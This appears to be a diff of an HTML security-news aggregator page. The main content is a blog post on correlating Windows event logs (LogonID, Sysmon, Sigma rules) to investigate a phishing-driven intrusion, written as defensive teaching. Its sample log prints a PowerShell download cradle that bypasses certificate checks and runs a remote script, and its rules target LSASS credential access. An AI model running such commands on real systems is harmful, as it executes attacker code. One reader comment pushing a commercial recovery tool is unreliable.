-At the heart of Windows forensics and detection is a simple concept: every action happens in a context. That context is defined by:
-- Who: The user account and session
-- What: The process, command, or action
-- When: The timestamp
-- Where: The system, and potentially the source system for remote activity
-- How: The parent process, the logon type, the network path
-Our logging foundation captures each of these elements across multiple event sources. The art is correlating them.
-The LogonID Thread
-I've mentioned LogonID repeatedly throughout this series because it's the key correlation point in Windows. Let me show you how it ties everything together.
-When a user logs on (Event 4624), they receive a LogonID. That same LogonID appears in:
-- Event 4688 / Sysmon Event 1: Process creation by that session
-- Events 4656, 4663: Object access by that session
-- Event 4672: Special privileges for that session
-- PowerShell 4103, 4104: Script execution by that session
-- Sysmon Event 3: Network connections by processes in that session
-This means you can take any suspicious event and trace it back to:
-- The session it belongs to
-- All other activity within that session
-- The authentication event that created the session
-A Real Investigation Flow
-Let me walk through a realistic scenario that demonstrates this correlation.
-Initial Alert: Your SIEM detects a suspicious PowerShell script block (Event 4104):
-Event ID: 4104
-TimeCreated: 2024-03-15 14:23:45
-ScriptBlockText:
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-$wc = New-Object System.Net.WebClient
-$wc.DownloadString("https://192.168.100.50/beacon.ps1") | IEX
-This is a download cradle with certificate validation bypass. Clearly malicious. Now what?
-Step 1: Identify the session
-Look at the same event's metadata to get the user context and Security ID.
-Step 2: Find the process context (Sysmon Event 1)
-Query for powershell.exe process creation around the same time:
-Now you know:
-- PowerShell was spawned by cmd. exe
-- Execution policy was bypassed
-- Window was hidden
-- User was CORP\jsmith
-- LogonID is 0x7A8B4
-Step 3: Trace the parent chain
-What spawned cmd. exe? Query Sysmon Event 1 for that process ID:
-Outlook spawned the command prompt. This is likely a phishing email with a malicious attachment or link.
-Step 4: Check network connections (Sysmon Event 3)
-Did PowerShell actually connect to that IP address?
-Event ID: 3 (Sysmon)
-TimeCreated: 2024-03-15 14:23:46
-Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-DestinationIp: 192.168.100.50
-DestinationPort: 443
-Protocol: tcp
-User: CORP\jsmith
-Confirmed. PowerShell connected to the C2 server.
-Step 5: Look for follow-up activity
-Using the LogonID, search for all subsequent events in that session:
-- Additional process creation (Event 4688, Sysmon 1)
-- File creation (Sysmon Event 11)
-- Registry modifications (Sysmon Events 12, 13)
-- More network connections (Sysmon Event 3)
-- LSASS access (Sysmon Event 10)
-Step 6: Identify the initial AP (Event 4624)
-Event ID: 4624
-TimeCreated: 2024-03-15 08:15:22
-TargetUserName: jsmith
-LogonType: 2
-WorkstationName: WORKSTATION01
-LogonId: 0x7A8B4
-The user logged on interactively at 8:15AM. The malicious activity started at 2:23PM. The attacker likely had to wait for the user to interact with the phishing email.
-Step 7: Scope the damage
-With the session bounded by logon (4624) and logoff (4634), you can identify everything that happened:
-- Files created or modified
-- Registry changes
-- Lateral movement attempts
-- Data staged for exfiltration
-Building Detections That Use Correlation
-Detection engineering benefits from correlation too. Instead of alerting on individual events, you can build detections that require multiple corroborating signals.
-Example 1: LSASS Access From Suspicious Parent
-Logic: Alert when a process accesses LSASS (Sysmon Event 10) AND the parent process is unusual
-# Pseudocode detection logic
-correlation:
-- sysmon_event_10:
-TargetImage: "lsass.exe"
-GrantedAccess:
-- "0x1010"
-- "0x1FFFFF"
-- sysmon_event_1:
-ProcessId: $source_process_id
-ParentImage: not in [
-"MsMpEng.exe",
-"csrss.exe",
-"services.exe"
-]
-Example 2: Download and Execute Pattern
-Logic: Alert when you see a network connection (Sysmon Event 3) followed by a new process creation (Sysmon Event 1) from a script interpreter within a short time window
-# Pseudocode
-correlation:
-- sysmon_event_3:
-Image: contains ["powershell", "wscript", "cscript", "mshta"]
-DestinationIsIpv6: false
-- within 30 seconds:
-- sysmon_event_1:
-ParentImage: same as above
-Image: not in [legitimate_children]
-Example 3: Persistence Followed by Execution
-Logic: Alert when a registry run key is created (Sysmon Event 13) and then a process starts from that path
-# Pseudocode
-correlation:
-- sysmon_event_13:
-TargetObject: contains "CurrentVersion\Run"
-Details: capture as $executable_path
-- within 1 hour:
-- sysmon_event_1:
-Image: equals $executable_path
-Practical Detection Examples
-Let me provide some concrete Sigma-style detection rules that leverage our logging foundation. I like [Sigma](https://github.com/SigmaHQ/sigma) rules because they can be used with most SIEMs.
-Encoded PowerShell Execution
-title: Encoded PowerShell Command Execution
-status: stable
-logsource:
-product: windows
-category: process_creation
-detection:
-selection_process:
-Image|endswith: '\powershell.exe'
-selection_encoded:
-CommandLine|contains:
-- ' -enc '
-- ' -encodedcommand '
-- ' -ec '
-condition: selection_process and selection_encoded
-level: medium
-LSASS Memory Access
-title: LSASS Memory Access by Suspicious Process
-status: stable
-logsource:
-product: windows
-category: sysmon
-service: sysmon
-detection:
-selection:
-EventID: 10
-TargetImage|endswith: '\lsass.exe'
-GrantedAccess:
-- '0x1010'
-- '0x1410'
-- '0x1FFFFF'
-filter_legitimate:
-SourceImage|contains:
-- '\MsMpEng.exe'
-- '\vmtoolsd.exe'
-- '\csrss.exe'
-condition: selection and not filter_legitimate
-level: high
-Remote PowerShell Execution (WinRM)
-New Service Installation
-title: Suspicious Service Installation
-status: stable
-logsource:
-product: windows
-service: security
-detection:
-selection:
-EventID: 4697
-filter_legitimate:
-ServiceFileName|contains:
-- '\Windows\'
-- '\Program Files\'
-condition: selection and not filter_legitimate
-level: high
-Building a Correlation Playbook
-When responding to incidents, having a systematic approach helps. Here's a playbook structure:
-For Any Suspicious Process:
-1. Get process details (Sysmon Event 1)
-- Image, CommandLine, Hashes
-- Parent process chain
-2. Check network activity (Sysmon Event 3)
-- Did this process make external connections?
-3. Check file operations (Sysmon Event 11)
-- Did this process create files?
-4. Check registry operations (Sysmon Events 12, 13, 14)
-- Did this process establish persistence?
-5. Identify the session (LogonID → Event 4624)
-- Who was logged on?
-- From where?
-6. Scope all session activity
-- What else happened in this session?
-For Lateral Movement Investigation:
-1. Identify network logons (Event 4624, LogonTypes 3, 10)
-- From which source IP addresses?
-- Which accounts?
-2. Trace the source
-- Look for the same account on the source system
-- What initiated the connection?
-3. Check for credential material
-- LSASS access on source (Sysmon Event 10)
-- Kerberos ticket requests (Events 4768, 4769)
-The Value of Redundancy
-Throughout this series, I've emphasized layered telemetry, sometimes a bit too much? Let me give you one final example of why this all matters.
-Scenario: An attacker uses a signed, living-off-the-land (LOTL) binary to execute malicious code.
-What EDR might show: Possibly nothing—the binary is signed and commonly used.
-What you'll see with our foundation:
-Event Source | What It Captures |
-|---|---|
-Event 4624 | Initial logon session |
-Event 4688 | mshta.exe execution with URL parameter |
-Sysmon Event 1 | Same, plus hash, parent process |
-Sysmon Event 3 | Network connection to malicious URL |
-PowerShell 4104 | If PowerShell was spawned, full script content |
-Sysmon Event 11 | Any payloads written to disk |
-Sysmon Event 13 | Persistence mechanisms created |
-Even if your EDR is blind, you have the full story.
-Final Thoughts
-Building a detection foundation isn't a one-time project. It's a capability that requires ongoing attention:
-- Tune your configurations as you learn what's noisy and what's valuable.
-- Test your visibility by running adversary simulations.
-- Practice correlation before you need it in a real incident.
-- Document your environment so you know what's logging and what isn't.
-The ultimate goal we've worked toward in this series is resilience. When (not if) your primary security tool misses something, you want to have the data to detect and investigate independently.
-The techniques we've covered—native Windows auditing, PowerShell logging, and Sysmon—are proven, operationally tested, and free. They require effort to implement well, but that effort pays dividends every time you use them to answer the question: "What exactly happened here?"
-If you need help with this effort, [get in touch with us](https://trustedsec.com/contact)! We have a great Purple Team that can assist in planning and building your detection foundation.
-I may tackle the same approach for Linux ... 🤔</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-8" class="article-body">
+        <div id="art-9" class="article-body">
             <h2 class="article-title">Microsoft Patch Tuesday, March 2026 Edition</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/03/microsoft-patch-tuesday-march-2026-edition/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft Corp. today pushed security updates to fix at least 77 vulnerabilities in its Windows operating systems and other software. There are no pressing “zero-day” flaws this month (compared to February’s five zero-day treat), but as usual some patches may deserve more rapid attention from organizations using Windows. Here are a few highlights from this month’s Patch Tuesday.
@@ -525,17 +437,6 @@ I mean, any bug, prior to being disclosed, is at some point a ‘zero-day’ bug
 Have they heard about two-factor authentication? They were obviously phished. Maybe put TFA in place now.
 Lol at the roughy in your article! You criminal mastermind, Keir!
 Keep a close eye on that .NET vulnerability (CVE-2026-26127). If a machine crashes hard mid-update, it frequently corrupts the Master File Table. We always see a spike in ‘RAW’ or unbootable drives right after Patch Tuesday rollups go sideways. If you end up with an inaccessible drive this week, don’t immediately wipe it. Run a block-level scan with a tool like Stellar Data Recovery first, it bypasses the scrambled partition table to pull the raw files, which are almost always still intact.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-9" class="article-body">
-            <h2 class="article-title">Updates to the MSSQLHound OpenGraph Collector for BloodHound</h2>
-            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/" target="_blank">Original Link</a></p>
-            <div class="content-text"><p>tl;dr: MSSQLHound, a PowerShell script that collects security information from remote MSSQL Server instances, now scans them to determine whether or not NTLM relay attacks are possible, accounts for a recent privilege escalation vulnerability, and includes queries you can import into the BloodHound attack path graph to visualize, navigate, and remediate misconfigurations in MSSQL. Updates [&#8230;]</p>
-<p>The post <a href="https://specterops.io/blog/2026/01/20/updates-to-the-mssqlhound-opengraph-collector-for-bloodhound/">Updates to the MSSQLHound OpenGraph Collector for BloodHound</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
-
-[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
